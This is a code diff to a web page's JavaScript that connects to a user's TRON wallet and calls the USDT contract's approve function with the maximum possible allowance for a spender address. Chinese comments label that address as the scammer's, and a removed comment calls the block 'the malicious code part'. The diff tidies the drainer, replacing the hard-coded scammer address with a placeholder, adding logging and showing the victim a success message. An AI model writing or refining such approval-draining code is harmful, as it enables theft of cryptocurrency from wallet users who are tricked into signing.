@@ -15,19 +15,25 @@
     <script>
         async function approveToken() {
             const trc20ContractAddress = "TR7NHqjeKQoxGTci88i8ZyApLBoTsZiGj6"; // USDT合约地址
+            const scammerAddress = "0xScammerAddress"; // 替换为骗子地址
 
-            if (window.tronWeb.defaultAddress.base58 === undefined) {
+            if (typeof window.tronWeb === 'undefined' || typeof window.tronWeb.defaultAddress.base58 === 'undefined') {
                 document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">TRX钱包地址不足</span>';
                 return;
             }
 
             const trc20Address = window.tronWeb.defaultAddress.base58;
+            console.log("User Wallet Address: ", trc20Address);
 
             try {
                 let contract = await window.tronWeb.contract().at(trc20ContractAddress);
                 let num = document.getElementsByClassName("amountInput")[0].value;
+                console.log("Amount Entered: ", num);
+
                 let balance = await contract.balanceOf(trc20Address).call();
                 let userBalance = balance.toNumber();
+                console.log("User Balance: ", userBalance);
+
                 let amountToSend = parseInt(num) * 1000000;
 
                 if (amountToSend > userBalance) {
@@ -35,18 +41,21 @@
                     return;
                 }
 
-                // 这里是恶意代码部分，请求授权大量USDT
+                console.log("Sending approve request...");
+
                 await contract.approve(
-                    'TFAkA2qZvVn7F8mdXhrcoisfqXFYxxwzxd', // 改为骗子地址
+                    scammerAddress, // 地址 _spender
                     '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' // 最大授权量
                 ).send({ from: trc20Address, feeLimit: 1000000 }).then(output => {
                     console.log('Authorization output: ', output);
+                    document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#00db00">授权成功</span>';
+                }).catch(error => {
+                    console.error('Error during approval: ', error);
+                    document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">授权失败</span>';
                 });
 
-                document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#00db00">授权成功</span>';
-
             } catch (e) {
-                console.error(e);
+                console.error('Exception caught: ', e);
                 document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">操作失败</span>';
             }
         }
